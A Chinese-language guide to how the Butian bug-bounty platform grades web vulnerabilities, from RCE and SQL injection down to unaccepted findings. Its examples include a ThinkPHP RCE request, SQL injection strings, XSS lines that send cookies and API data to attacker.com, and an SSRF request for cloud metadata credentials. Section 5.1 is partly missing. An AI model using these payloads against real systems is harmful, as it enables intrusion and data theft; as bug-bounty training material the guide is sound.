## 1. 漏洞价值金字塔

### 1.1 分级总览

漏洞的价值不是由漏洞类型单一决定的，而是由**实际危害**决定的。下面从高到低排列各类漏洞在补天平台的典型价值：

```
                  ⭐ 高价值
              ┌─────────────┐
             /     RCE      \
            /    SQL注入     \
           /   任意账号登录   \
          /   大范围越权      \
         /   命令执行         \
        └─────────────────────┘

                  ⭐⭐ 中价值
              ┌─────────────┐
             /   存储型XSS   \
            /   越权看数据    \
           /   逻辑漏洞       \
          /   SSRF          \
         /   文件上传(有危害)  \
        └─────────────────────┘

                  ⭐⭐⭐ 低价值
              ┌─────────────┐
             /   反射型XSS    \
            /   URL跳转       \
           /   CORS配置问题   \
          /   信息泄露        \
         /   CSRF(无配合)     \
        └─────────────────────┘

                  ⭐⭐⭐⭐ 不收录
              ┌─────────────┐
             /   端点存在      \
            /   内网IP泄露     \
           /   PHPinfo       \
          /   路径信息泄露    \
         /   低危信息泄露     \
        └─────────────────────┘
```

### 1.2 高价值漏洞详解

#### 1.2.1 RCE（远程命令执行）

**危害等级**：严重 — 造成系统完全失陷

**在补天的典型评分**：高危-严重

**什么是RCE**：
攻击者通过Web应用的漏洞，在服务器上执行任意系统命令。RCE是最严重的漏洞类型之一，因为它意味着攻击者可以直接控制服务器。

**常见RCE来源**：

```
1. 命令注入（Command Injection）
   - 用户在输入框输入 `; rm -rf /` 等命令
   - 常见于：ping功能、nslookup功能、系统命令调用

2. 代码执行（Code Execution）
   - 文件上传后包含
   - eval()/system() 等危险函数调用
   - 模板引擎注入（SSTI）
   - 反序列化漏洞

3. 框架漏洞
   - ThinkPHP RCE（5.x系列多个RCE漏洞）
   - Struts2 RCE（多个变种）
   - Fastjson反序列化
   - Log4j JNDI注入
```

**实战案例**：
> 某政务系统使用了 ThinkPHP 5.0 框架，通过 `/index.php?s=captcha` 路由直接执行系统命令：
> ```
> GET /index.php?s=captcha&method=GET&c=calc&f=calc&id=whoami
> ```
> 返回结果显示 `www-data`，确认RCE。补天评分：**严重**。

**如何判断RCE的价值**：

| 因素 | 高价值特征 | 低价值特征 |
|------|-----------|-----------|
| 执行权限 | 可执行任意命令 | 被 disable_functions 限制 |
| 网络访问 | 可出网 | 完全隔离 |
| 数据价值 | 能访问数据库 | 仅影响当前进程 |
| 利用难度 | 稳定利用 | 需要复杂条件触发 |

#### 1.2.2 SQL注入（有数据）

**危害等级**：高危 — 造成数据库数据泄露

**在补天的典型评分**：高危

**为什么SQL注入是高危**：
SQL注入可以直接从数据库中读取、修改、删除数据。对于存储了大量用户数据（手机号、身份证、银行卡）的系统，SQL注入的危害不可估量。

**SQL注入的严重程度分级**：

```
严重：联合查询 + 可提权（执行系统命令）
高危：联合查询 + 可读取数据库所有数据（数据量庞大）
中危：报错注入/布尔盲注（可读取有限数据）
低危：时间盲注（速度极慢，利用条件苛刻）
```

**实战案例**：
> 某电商平台搜索接口：
> ```
> GET /api/product/search?keyword=手机&page=1
> ```
> 参数 `keyword` 存在SQL注入：
> ```
> keyword=手机' UNION SELECT 1,user(),database(),version(),table_name FROM information_schema.tables --
> ```
> 成功获取数据库用户为 `root@localhost`，数据库为 `ecommerce_db`。
> 进一步利用获取所有用户数据。补天评分：**高危**。

**SQL注入的"有数据"和"无数据"区别**：

- **有数据**：能从数据库中提取出有价值的敏感数据（用户信息、订单、密码哈希等）
- **无数据**：只能证明注入存在，但数据被WAF拦截/编码问题/权限不足无法提取

**补天收录标准**：能证明提取到数据的SQL注入才被认定为高危。如果只是报错信息，通常评为中危或低危。

#### 1.2.3 任意账号登录

**危害等级**：高危-严重 — 造成账号失陷

**在补天的典型评分**：高危

**什么是任意账号登录**：
攻击者可以不经过正常认证流程，直接登录任意用户的账号。这包括：

```
1. 任意密码重置
   - 修改密码链接没有绑定用户
   - 验证码/Token可被枚举
   - 重置接口没有限制

2. 会话固定/劫持
   - 可以设置任意session
   - token生成可预测

3. OAuth登录绕过
   - 回调地址未校验
   - state参数未校验

4. 登录绕过
   - 直接修改请求包中的user_id
   - 跳过登录步骤直接访问管理后台
```

**实战案例**：
> 某SaaS平台忘记密码功能：
> ```
> POST /api/forgot-password
> {"phone": "13800138000", "code": "123456"}
> ```
> 验证码是6位纯数字，且无错误次数限制。
> 使用Burp Intruder暴力枚举：
> - 发送100000次请求（12小时内完成）
> - 枚举到验证码为 `884725`
> - 成功重置管理员账号密码
> 补天评分：**高危**。

#### 1.2.4 大范围越权

**危害等级**：高危 — 造成大量数据泄露

**在补天的典型评分**：高危

**什么是大范围越权**：
攻击者可以通过修改ID/参数，访问到大量其他用户的数据。越权分为水平越权（相同权限级别）和垂直越权（提升权限）。

**典型场景**：

```
水平越权：
- 普通用户可以查看其他普通用户的订单
- 老师可以查看其他老师的学生信息
- 商户可以查看其他商户的交易记录

垂直越权：
- 普通用户可以执行管理员操作
- 普通用户可访问管理后台
- 普通用户可以修改系统配置
```

**如何判断越权的严重程度**：

| 因素 | 高价值 | 中价值 | 低价值 |
|------|--------|--------|--------|
| 可访问的数据量 | 全量用户数据 | 部分用户数据 | 少数几条记录 |
| 数据敏感度 | 身份证/银行/密码 | 姓名/电话/地址 | 非敏感数据 |
| 操作权限 | 增删改查 | 查看 | 查看非敏感数据 |
| 越权范围 | 全局越权 | 有条件越权 | 仅越权读 |

**实战案例**：
> 某在线教育平台，查看作业接口：
> ```
> GET /api/homework/detail?homework_id=1001
> ```
> 修改homework_id为1002，查看到另一个学生的作业。
> 进一步发现homework_id是连续递增的，可以遍历查看所有人的作业。
> 作业中包含了学生的学号、姓名、课程信息。
> 补天评分：**中危**（数据不够敏感，但如果改为看成绩/财务信息就是高危）。

### 1.3 中价值漏洞详解

#### 1.3.1 存储型XSS

**危害等级**：中危 — 可执行任意前端脚本

**在补天的典型评分**：中危

**存储XSS vs 反射XSS**：

| 维度 | 存储XSS | 反射XSS |
|------|---------|---------|
| 存储位置 | 数据库中 | URL参数 |
| 触发方式 | 访问页面即触发 | 需要点击链接 |
| 影响范围 | 所有访问用户 | 仅点击链接的用户 |
| 持续影响 | 长期有效 | 一次性 |
| 补天评分 | 中危 | 低危或不收 |

**为什么存储XSS是中危**：
存储XSS可以在目标网站上植入恶意脚本，所有访问该页面的用户都会被执行脚本。可以用来：

```
1. 窃取cookie/session
2. 伪造页面内容（钓鱼）
3. 执行管理员操作（如果管理员访问了）
4. 键盘记录
5. 内网扫描
```

**存储XSS的高危场景**：
> 如果存储XSS发生在管理后台，当管理员查看用户提交的内容时触发，则可以窃取管理员session，从而获得管理员权限。这种场景下存储XSS可以升级为高危漏洞。

**实战案例**：
> 某论坛的个人签名处存在存储XSS：
> ```
> <script>document.location='https://attacker.com/steal.php?c='+document.cookie</script>
> ```
> 其他用户访问该用户的帖子时，cookie被发送到攻击者服务器。
> 由于签名内容对其他用户可见，影响范围大。
> 补天评分：**中危**。

#### 1.3.2 越权看数据（非全量）

**危害等级**：中危 — 部分数据泄露

**在补天的典型评分**：中危

**分类**：
```
1. 越权查看指定用户数据（如看特定用户的订单）
2. 越权查看指定资源（如看一篇特定文章）
3. 越权查看非敏感数据（如查看课程安排）
```

**何时可升级为高危**：
- 可查看的数据量巨大（全量导出）
- 数据敏感（身份证、银行卡、密码）
- 可查看管理员权限的资源

#### 1.3.3 逻辑漏洞

**危害等级**：中危-高危 — 根据实际影响

**在补天的典型评分**：中危（部分高危）

**常见逻辑漏洞**：

```
1. 支付漏洞
   - 修改金额（0元购）
   - 修改数量（负数）
   - 修改支付状态

2. 优惠券漏洞
   - 重复领取
   - 无限使用
   - 叠加使用

3. 积分漏洞
   - 刷积分
   - 积分篡改

4. 验证绕过
   - 跳过步骤
   - 参数篡改
   - 条件竞争
```

**实战案例**：
> 某电商平台下单接口：
> ```
> POST /api/order/create
> {"product_id": 1001, "price": 199.00, "quantity": 1}
> ```
> 尝试修改 `price` 为 `0.01`：
> ```
> {"product_id": 1001, "price": 0.01, "quantity": 1}
> ```
> 成功以0.01元购买价值199元的商品。
> 此漏洞属于"前端传价格、后端不校验"的经典逻辑漏洞。
> 补天评分：**高危**（涉及金钱损失）。

#### 1.3.4 SSRF（服务端请求伪造）

**危害等级**：中危-高危 — 根据利用场景

**在补天的典型评分**：中危

**SSRF的价值取决于能做什么**：

```
低价值SSRF：
- 只能访问内网HTTP服务
- 返回信息少
- 只能在某些特定链接上触发

高价值SSRF：
- 可以访问内网所有端口
- 可以访问Redis/Memcached/MySQL等内网服务
- 可以读取云服务器元数据（AWS: 169.254.169.254）
- 可以与内网HTTP服务交互（如Web管理后台）
```

**实战案例**：
> 某网站图片处理功能：
> ```
> GET /api/image/proxy?url=https://example.com/img.jpg
> ```
> 将url改为内网地址：
> ```
> GET /api/image/proxy?url=http://169.254.169.254/latest/meta-data/
> ```
> 成功读取云服务器元数据，包含IAM临时凭证。
> 通过IAM凭证可以访问云资源。
> 补天评分：**高危**。

### 1.4 低价值漏洞详解

#### 1.4.1 反射型XSS

**危害等级**：低危 — 需用户交互

**在补天的典型评分**：低危（部分不收）

**为什么反射XSS价值低**：
1. 需要用户点击恶意链接（社工难度大）
2. 需要用户已登录目标网站（额外条件）
3. 浏览器XSS防护（X-XSS-Protection）会拦截部分XSS
4. Cookie的HttpOnly属性阻止session窃取（即使XSS也拿不到cookie）
5. 影响范围受限于点击链接的用户数

**反射XSS在补天的收录情况**：
```
1. 有HttpOnly + 有CSRF Token → 基本不收（无法利用）
2. 有HttpOnly + 无CSRF Token → 可配合CSRF，低危-中危
3. 无HttpOnly → 可以窃取session，低危-中危
4. 在登录页面 → 可以钓鱼，低危
5. 在管理后台 → 可以有更大危害（中危）
```

**反射XSS的"可利用"判断标准**：
> 一个反射XSS漏洞，如果攻击者无法通过它造成实际危害（比如无法获取敏感信息、无法让受害者执行操作），那么即使XSS本身存在，补天也可能判定为"无实际影响"而不予收录。

#### 1.4.2 URL跳转

**危害等级**：低危 — 钓鱼用途

**在补天的典型评分**：低危（部分不收）

**为什么URL跳转价值低**：
1. 可以直接在浏览器地址栏看到跳转目标
2. 只能用于钓鱼（而且是比较低端的钓鱼）
3. 现代浏览器会显示安全警告
4. 需要用户信任并点击链接

**补天收录标准**：
- 可以跳转到任意域名 → 低危
- 只能跳转到同域名 → 不收
- 需要用户交互才能跳转 → 不收

#### 1.4.3 CORS配置问题

**危害等级**：低危 — 需要配合其他漏洞

**在补天的典型评分**：低危或不收

**为什么CORS配置问题价值低**：
1. CORS本身只是一个配置策略
2. 需要配合XSS使用才能造成危害
3. 仅凭CORS无法窃取数据
4. 如果目标没有敏感信息，即使CORS配置有问题也无所谓

**补天收录标准**：
- 仅CORS配置不当（`Access-Control-Allow-Origin: *`） → 通常不收
- CORS + 目标有敏感API → 低危
- CORS + XSS组合利用 → 按XSS评分

#### 1.4.4 信息泄露（一般性）

**危害等级**：低危 — 无直接危害

**在补天的典型评分**：低危（部分不收）

**补天对信息泄露的态度**：

```
收录的（低危）：
- 泄露手机号/身份证（批量）
- 泄露数据库连接密码
- 泄露云服务器密钥（AK/SK）
- 源码泄露（.git目录）

一般不收的：
- 服务器版本信息（Apache/2.4.41）
- PHPinfo页面（特定漏洞除外）
- 报错信息中的路径
- 注释中的开发者信息
- 404页面信息
```

### 1.5 不收录漏洞详解

#### 1.5.1 端点存在

**为什么不被收录**：
> 发现一个 `/admin/` 路径、一个 `/api/` 端点，但这只是存在而已。没有实际的漏洞利用，无法证明真实危害。

**补天的态度**：
```
"我们发现该路径存在，但未发现实际安全隐患，
建议继续深入测试，如发现可实际利用的安全漏洞再提交。"
```

#### 1.5.2 内网IP泄露

**为什么不被收录**：
> HTTP响应头中的 `X-Forwarded-For` 或报错信息中的内网IP地址，虽然可能对攻击者有帮助，但如果没有配合其他漏洞，无法单独造成危害。

**注意**：
- 如果内网IP泄露 + 存在SSRF漏洞 = 可以升级
- 仅内网IP泄露 = 不收

#### 1.5.3 PHPinfo

**为什么不被收录**：
> PHPinfo页面虽然有很多配置信息，但无法直接利用。除非存在配合漏洞（如文件包含），否则补天通常不收。

**例外**：
- 如果PHPinfo页面显示`disable_functions`为空的 → 可以配合文件上传漏洞
- 如果服务器有非默认配置 → 可能有价值

#### 1.5.4 其他不收的漏洞类型

```
综合列表：
1. 内容嗅探（X-Content-Type-Options缺失）
2. 缺少安全头（X-Frame-Options等）
3. HSTS未启用
4. 弱密码策略（无实际利用）
5. 用户名枚举（无其他漏洞配合）
6. 自签名证书
7. 开放端口（无服务指纹）
8. 蜘蛛协议文件（robots.txt）中泄露的路径
9. 过期SSL证书
10. 中间件默认页面
11. 验证码未刷新
12. 未绑定手机/邮箱的提醒
```

## 2. 补天收录规则详解

### 2.1 高危漏洞收录标准

**高危定义**：有直接危害，能造成实际损失或数据泄露

**高危漏洞的详细标准**：

| 漏洞类型 | 高危标准 | 非高危标准 |
|---------|---------|-----------|
| SQL注入 | 可获取数据表数据 | 仅报错信息 |
| RCE | 可执行系统命令 | 有限制的命令执行 |
| 越权 | 可访问大量敏感数据 | 仅访问少量非敏感数据 |
| 文件上传 | 上传webshell | 上传HTML文件 |
| SSRF | 可访问内网敏感服务 | 仅访问外部URL |
| 逻辑漏洞 | 造成经济损失 | 仅绕过非核心功能 |
| XSS（存储） | 管理后台触发 | 普通用户页面触发 |
| 权限提升 | 普通用户到管理员 | 普通用户到普通用户 |

### 2.2 中危漏洞收录标准

**中危定义**：有数据泄露风险，但不直接造成严重危害

**中危漏洞的详细标准**：

| 漏洞类型 | 中危标准 | 示例 |
|---------|---------|------|
| 存储XSS | 非管理页面触发 | 个人资料页XSS |
| 越权 | 查看其他用户非敏感数据 | 看订单但不含详细个人信息 |
| SQL注入 | 报错信息泄露数据 | 数据库版本、路径信息 |
| 信息泄露 | 泄露部分用户敏感数据 | 部分手机号、邮箱 |
| SSRF | 可访问内网非敏感服务 | 内网Web服务 |
| 逻辑漏洞 | 绕过非关键验证 | 优惠券重复领取 |
| 文件读取 | 可读取系统文件 | 读取配置文件 |
| 目录遍历 | 可遍历目录或读取文件 | 读取日志文件 |

### 2.3 低危漏洞收录标准

**低危定义**：轻微信息泄露或无直接危害

**低危漏洞的详细标准**：

```
1. 反射XSS（无HttpOnly → 可利用）
2. 路径遍历（低敏感）
3. 部分报错信息泄露
4. 少量用户信息泄露
5. URL跳转（可跳转到外部）
6. 弱密码验证
7. CORS配置（有实际利用场景）
8. CSRF（可实现敏感操作）
9. 会话固定
10. 点击劫持（有敏感操作页面）
```

### 2.4 不收的漏洞类型

**不收录的详细列表**：

```
【配置类】
- 缺少安全响应头（X-Frame-Options, CSP等）
- 缺少HSTS
- SSL配置问题
- robots.txt泄露
- .git/config 存在但无敏感信息

【信息类】
- 服务器版本信息
- PHPinfo（无其他配合漏洞）
- 404错误页面信息
- 调试信息
- 路径泄露

【存在类】
- 端点存在（/admin, /api, /login等）
- 端口开放
- 服务指纹
- 中间件默认页面
- 无实际影响的枚举

【无危害类】
- 自签名证书
- 过期证书
- 验证码可识别（但无爆破场景）
- 用户名枚举（无密码爆破配合）
- 密码明文传输（但网站使用HTTPS）
```

## 3. 如何判断一个发现的真实危害

### 3.1 能不能造成实际损失？

**核心问题**：这个漏洞能让攻击者做什么？

**实际损失的维度**：

```
1. 经济损失
   - 可以修改订单价格吗？
   - 可以提现/转账吗？
   - 可以领取优惠券/积分吗？

2. 声誉损失
   - 可以篡改网站内容吗？
   - 可以在页面中插入恶意内容吗？
   - 可以关闭/破坏服务吗？

3. 法律风险
   - 可以获取用户隐私数据吗？
   - 可以绕过实名认证吗？
   - 可以伪造交易记录吗？

4. 运营损失
   - 可以篡改关键业务数据吗？
   - 可以删除重要记录吗？
   - 可以瘫痪业务系统吗？
```

**判断方法论**：

```
当你发现一个漏洞后，问自己：
1. "如果我是一个恶意攻击者，我可以用这个漏洞做什么？"
2. "这个操作能造成什么后果？"
3. "这个后果是否严重？"
4. "需要什么条件才能造成这个后果？"

如果回答是：
- 可以导致严重后果 + 不需要额外条件 = 高危
- 可以导致中度后果 + 需要少量条件 = 中危
- 无法导致明显后果 + 需要很多条件 = 低危或不收
```

**实战案例**：
> 发现目标的一个API返回了其他用户的信息：
> ```
> GET /api/user/profile?user_id=1001
> ```
> 修改user_id=1002返回了另一个用户的姓名和电话。
> 
> **判断过程**：
> 1. 可以做什么？ → 可以获取任意用户的姓名和电话
> 2. 后果？ → 用户隐私泄露，可用于骚扰/诈骗
> 3. 严重吗？ → 中等（姓名+电话是敏感但非最高敏感）
> 4. 条件？ → 无额外条件，只要注册即可
> 
> **结论**：中危（批量获取用户联系方式）

### 3.2 能不能获取敏感数据？

**敏感数据分级**：

```
第一级（最高敏感 - 高危）：
- 身份证号码
- 银行卡号/信用卡号
- 登录密码（明文/可破解）
- 支付密码
- Token/Key（云服务AK/SK、数据库密码等）
- 医疗记录/病历信息

第二级（高敏感 - 高危-中危）：
- 手机号码
- 详细家庭住址
- 工作单位
- 邮箱地址（个人）
- 订单详情
- 聊天记录

第三级（中敏感 - 中危）：
- 姓名
- 部分手机号/邮箱（脱敏数据）
- 非关键业务数据
- 服务器配置信息

第四级（低敏感 - 低危/不收）：
- 公开信息
- 脱敏后的用户画像数据
- 系统版本号
- 非关键日志
```

**判断数据泄露严重程度的方法**：

```
1. 泄露数量：10条 vs 10万条
2. 数据精度：完整信息 vs 脱敏信息
3. 组合分析：单独一个姓名无价值 + 姓名+电话+地址=有价值
4. 行业特点：医疗数据 > 金融数据 > 教育数据 > 社交数据
5. 影响时效：长期有效（身份证） > 时效性（session）
```

**实战案例**：
> 某医疗系统越权API：
> ```
> GET /api/patient/detail?patient_id=5001
> ```
> 可以遍历查看所有患者的姓名、身份证号、手机号、病史、诊断记录。
> 
> 这个漏洞包含了：
> - 身份证号（最高敏感）
> - 医疗记录（最高敏感）
> - 全量数据（数万条）
> - 无任何访问限制
> 
> **结论**：高危漏洞

### 3.3 能不能影响其他用户？

**影响范围判断**：

```
1. 个人影响（低危-中危）
   - 只能影响当前用户
   - 其他用户不受影响
   - 示例：自己的资料修改越权

2. 群体影响（中危-高危）
   - 影响同类型所有用户
   - 例：所有商户的订单泄露
   - 例：所有学生的成绩泄露

3. 全局影响（高危-严重）
   - 影响所有用户
   - 影响系统整体安全
   - 例：管理员权限泄露
   - 例：全量用户数据泄露

4. 连锁影响（严重）
   - 部分漏洞可以连锁触发
   - 例：XSS获取管理员session + 管理后台越权 = 严重
   - 例：SQL注入获取密码 + 密码通用 = 严重
```

### 3.4 能不能绕过安全限制？

**常见的"半吊子"安全限制**：

```
1. 前端限制
   - 前端JS校验（后端未校验）
   - 前端隐藏按钮/功能（后端未鉴权）
   - 前端禁用输入（后端未过滤）
   → 绕过方法：直接发送HTTP请求

2. 简单的后端限制
   - 参数校验（但校验不严格）
   - 限额控制（但可绕过）
   - 权限控制（但有逻辑漏洞）
   → 绕过方法：修改参数、组合攻击

3. 强后端限制
   - 严格的参数校验
   - 签名机制
   - 多因素认证
   - 请求频率限制
   → 绕过方法：需要更深入的分析

4. 无法绕过的限制
   - 无懈可击的权限控制
   - 强制安全加固
   - 完整的输入输出过滤
   → 放弃该漏洞类型的测试
```

**如何证明一个漏洞可以绕过安全限制**：

```
1. 提供请求包（Burp Suite抓包的截图）
2. 提供修改后的请求包（证明绕过成功）
3. 提供返回结果（证明实际操作成功）
4. 提供对比（正常操作 vs 越权操作）
5. 证明这不是偶然（多次测试）
```

## 4. 常见误判

### 4.1 看起来严重其实不严重：SQL注入（仅有报错无数据）

**误判场景**：
> 发现一个SQL注入点，测试时返回MySQL报错信息：
> `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'''
> 或者：
> `Duplicate entry '1' for key 'group_key'`

**为什么可能不严重**：
- 报错信息中只包含了SQL片段或部分配置信息
- 无法从报错中提取到真实的数据
- 数据被WAF拦截，实际无法出数据
- 只影响了当前查询，无法进一步利用

**补天实际处理**：
- 如果只能看到报错但无法提取数据 → 中危或低危
- 如果能通过报错注入提取数据 → 高危
- 如果能通过联合查询获取数据 → 高危
- 如果只是路径泄露 → 低危或不收

**如何避免误判**：
```bash
# 确认是否能提取数据，不仅仅是报错
# 联合查询尝试
' UNION SELECT 1,2,3,4,5 --

# 报错注入尝试提取数据
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --

# 如果以上都失败，尝试时间盲注
' AND IF((SELECT 1 FROM users LIMIT 1)=1, SLEEP(5), 0) --
```

### 4.2 看起来严重其实不严重：反射XSS

**误判场景**：
> 在搜索框中输入 `<script>alert(1)</script>`，页面弹窗。
> 于是以为抓到一个高危XSS漏洞。

**为什么可能不严重**：
- 需要用户主动访问恶意链接（社工难度）
- Cookie有HttpOnly标志（无法窃取session）
- 有CSRF Token（无法执行敏感操作）
- 目标网站有XSS防护头（X-XSS-Protection）
- DOM型XSS在浏览器端执行，服务器端无影响

**补天实际处理**：
- 仅弹窗证明XSS存在 → 低危
- 有HttpOnly + 有CSRF Token → 基本不收
- 无HttpOnly + 可窃取cookie → 低危-中危
- 管理后台触发 → 中危

**如何判断反射XSS的真实价值**：

```javascript
// 测试步骤：
// 1. 尝试窃取cookie
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// 2. 检查cookie是否有HttpOnly
document.cookie // 如果返回空，说明cookie有HttpOnly

// 3. 尝试执行API操作（检查有无CSRF Token）
fetch('/api/user/profile').then(r => r.json()).then(d => fetch('https://attacker.com/steal?d='+JSON.stringify(d)))

// 4. 检查CSRF Token是否可获取
// 查看页面源代码，token是否在HTML中
```

### 4.3 看起来严重其实不严重：CORS配置

**误判场景**：
> 发现目标返回了 `Access-Control-Allow-Origin: *`，以为可以任意窃取数据。

**为什么可能不严重**：
- CORS本身只是一个跨域策略，不是漏洞
- 需要配合XSS才能造成危害
- 如果目标没有敏感数据，CORS配置毫无意义
- 静态资源的跨域访问通常是预期行为

**补天实际处理**：
- 仅CORS配置不当 → 不收
- CORS + 敏感API + 可证明数据窃取 → 低危
- CORS + 存在XSS → 按XSS评分

**什么时候CORS配置是真正的漏洞**：
```
1. 目标API包含敏感数据（用户详细信息、Token等）
2. API支持Credentials（withCredentials）
3. Origin反射回Response Headers（动态反射）
4. 可以证明其他域可以读取数据
```

### 4.4 看起来严重其实不严重：401/403端点

**误判场景**：
> 发现 `/admin/` 路径返回401未授权或403禁止访问。
> 以为这是一个未授权访问漏洞。

**为什么可能不严重**：
- 401/403正是**正确的安全配置**，阻止了未授权访问
- 如果是未授权访问，应该返回200并显示管理页面
- 发现一个被保护的路径不等于漏洞

**补天实际处理**：
- 仅发现受保护的路径 → 不收
- 如果有办法绕过认证（目录穿越、参数注入等） → 按实际危害评分
- 如果受保护的路径泄露了路径信息 → 低危或不收

**正确做法**：
```
不是：发现/admin/路径 → 漏洞
而是：发现/admin/路径 → 尝试绕过认证

尝试绕过方法：
1. X-Forwarded-For: 127.0.0.1
2. 修改Referer头
3. 添加Cookie/Session
4. 目录遍历（/admin/../user/profile）
5. 参数污染
6. HTTP方法切换（GET→POST, PUT→DELETE）
```

### 4.5 看起来严重其实不严重：文件上传（非webshell）

**误判场景**：
> 发现可以上传任意文件类型，以为是文件上传漏洞。

**为什么可能不严重**：
- 上传的图片文件被重命名（无法执行）
- 上传目录无执行权限（无法解析）
- 服务器配置安全（上传目录不能解析脚本）
- 文件内容被检查（图片头检查、内容检查）
- 上传的文件路径不可预测

**如何判断文件上传的真正价值**：

```
高价值：
1. 可以上传 .php/.jsp/.asp 等脚本文件
2. 上传后可以访问到上传的文件
3. 上传的文件可以被服务器解析执行
4. 文件路径可预测/可控

低价值：
1. 只能上传图片/文档等非脚本文件
2. 文件被重命名（无法执行）
3. 上传目录无执行权限
4. 文件内容被严格检查
5. 只能上传HTML文件（如头像上传）
```

**实战判断流程**：
```
第一步：尝试上传 .php 文件 → 成功/失败
失败 → 尝试绕过（双扩展名、大小写、重命名等）
成功 → 第二步

第二步：访问上传的文件 → 是否可访问
不可访问 → 没有利用价值
可访问 → 第三步

第三步：访问 .php 文件 → 是否以PHP解析
显示源码 → 不能执行（无价值）
执行了PHP代码 → 高危！

第四步：尝试上传 webshell
成功连接 → 严重！
```

### 4.6 看起来严重其实不严重：CSRF

**误判场景**：
> 发现修改密码接口没有CSRF Token，以为可以诱骗用户修改密码。

**为什么可能不严重**：
- 修改密码需要输入旧密码（CSRF无法获取旧密码）
- 修改密码后需要邮箱/手机验证
- 用户无法通过CSRF完成整个流程
- 页面有Referer验证（CSRF也需要绕过）
- SameSite Cookie属性阻止跨站请求

**补天实际处理**：
- 仅缺少CSRF Token但无法造成实际危害 → 不收
- CSRF + 可实现敏感操作（修改密码无旧密码验证） → 中危
- CSRF + 管理员权限操作 → 高危

### 4.7 看起来严重其实不严重：万能密码/SQL注入绕过登录

**误判场景**：
> 输入 `admin' OR '1'='1` 成功登录后台，以为找到高危SQL注入。

**为什么可能不严重**：
- 可能只是查询逻辑问题而非SQL注入
- 登录成功但权限受限
- 只有这一个点可以利用
- 无法进一步获取数据

**真正的判断标准**：
```
1. SQL注入（高危）：可以执行任意SQL语句
   ' UNION SELECT 1,2,3,4 --
   
2. SQL注入（中危）：报错但不一定能获取数据
   ' AND 1=2 --

3. 绕过登录（中危）：只能绕过登录，无法执行其他SQL操作
   admin' OR '1'='1

4. 逻辑漏洞（低危-中危）：查询逻辑问题
   比如：SELECT * FROM users WHERE username='admin' AND password=''
   → 可能是密码查询返回了第一条记录
```

### 4.8 看起来严重其实不严重：弱口令/默认密码

**误判场景**：
> 发现管理后台使用 `admin/admin123` 登录成功。

**为什么可能不严重**：
- 弱口令是一个"存在"的漏洞
- 但如果该后台没有其他功能，弱口令也无意义
- 如果该后台在公网暴露程度有限
- 如果登录IP有严格限制

**补天实际处理**：
- 非核心系统的弱口令 → 低危
- 核心系统的弱口令 → 中危
- 超级管理员的弱口令 → 高危
- 但请注意：补天对弱口令的收录较为严格，需要证明可造成实际危害

**正确判断**：
```
1. 该后台能做什么？
   - 只能查看日志 → 低危
   - 可以管理用户 → 中危
   - 可以管理服务器 → 高危

2. 使用什么账号登录？
   - 测试账号 → 低危
   - 普通管理员 → 中危
   - 超级管理员 → 高危

3. 登录后有什么数据？
   - 公开数据 → 低危
   - 普通用户数据 → 中危
   - 敏感数据（身份证、银行卡） → 高危
```

| 弱口令（非核心） | 低危 | 系统不重要 |
| CORS配置 | 低危/不收 | 是否有实际利用 |
| CSRF（敏感操作） | 中危 | 能否造成实际危害 |
| CSRF（非敏感操作） | 低危/不收 | 无实际危害 |
| 端点存在 | 不收 | - |
| 内网IP泄露 | 不收 | - |
| PHPinfo | 不收（可能有例外） | - |
| 路径泄露 | 不收/低危 | 配合其他漏洞 |
| 缺少安全头 | 不收 | - |

### 5.2 补天评分快速判断流程图

```
发现一个漏洞
    │
    ▼
能造成实际经济损失？
    ├── 能 → 高危 ↑
    └── 不能
          │
          ▼
能获取用户敏感数据？
    ├── 能（全量/批量） → 高危
    ├── 能（部分/少量） → 中危
    └── 不能
          │
          ▼
能获取非敏感数据？
    ├── 能 → 中危
    └── 不能
          │
          ▼
能帮助其他攻击？
    ├── 能（信息泄露/路径泄露） → 低危
    └── 不能
          │
          ▼
无实际危害 → 不收

同时考虑：
- 是否需要额外条件？条件越多，评分越低
- 是否只影响当前用户？影响范围小评分低
- 是否为已知问题？同类型漏洞已收过会降级
- 是否需要受害者交互？交互越多评分越低
```

### 5.3 补天提交前的自检清单

在提交每个漏洞之前，请逐一检查以下问题：

```markdown
## 提交前自检清单

### 漏洞确认
□ 这个漏洞是否可以稳定复现？（至少测试3次）
□ 是否可以提供完整的复现步骤？
□ 是否有清晰的请求包和响应包截图？
□ 是否确认在授权范围内？

### 危害评估
□ 这个漏洞能造成什么实际危害？
□ 这个危害是否够得上补天的收录标准？
□ 如果我是审核人员，我会认为这个漏洞有价值吗？
□ 是否有类似漏洞已经被提交过？

### 报告准备
□ 标题是否清晰说明了漏洞类型和位置？
□ 复现步骤是否让审核人员可以一步步操作？
□ 影响描述是否准确反映了漏洞的危害？
□ 截图是否清晰包含了关键信息？
□ 是否有可选的PoC代码？

### 合规检查
□ 测试过程中是否使用了自动化工具？（防止误报）
□ 是否只在测试范围内操作？
□ 是否没有下载/拖取数据？（只证明存在性）
□ 是否没有破坏/修改目标的数据？
□ 是否已经清除了测试过程中产生的数据？
```

### 5.4 漏洞类型与补天评分对照表（一键速查）

```
严重（补天积分100-150）：
  · 远程命令执行（RCE）
  · 文件上传获取Server权限
  · 全量数据拖库

高危（补天积分50-99）：
  · SQL注入（可提取数据）
  · 任意账户登录/密码重置
  · 大范围越权（敏感数据）
  · 垂直越权（普通用户→管理员）
  · 文件上传（WebShell）
  · SSRF（可访问内网敏感服务）
  · 逻辑漏洞（涉及财务）

中危（补天积分20-49）：
  · 存储型XSS
  · 越权访问（有限数据）
  · SQL注入（仅报错）
  · 逻辑漏洞（不涉及财务）
  · SSRF（有限制）
  · 文件下载（非敏感）
  · 大量用户信息泄露（非核心）
  · CSRF（可实现敏感操作）

低危（补天积分5-19）：
  · 反射型XSS
  · URL跳转
  · 部分信息泄露
  · 弱口令
  · CORS配置问题
  · 点击劫持
  · 路径泄露

不收录：
  · 端点存在
  · 内网IP泄露
  · PHPinfo
  · 缺少安全头
  · 服务器版本
  · robots.txt泄露
```
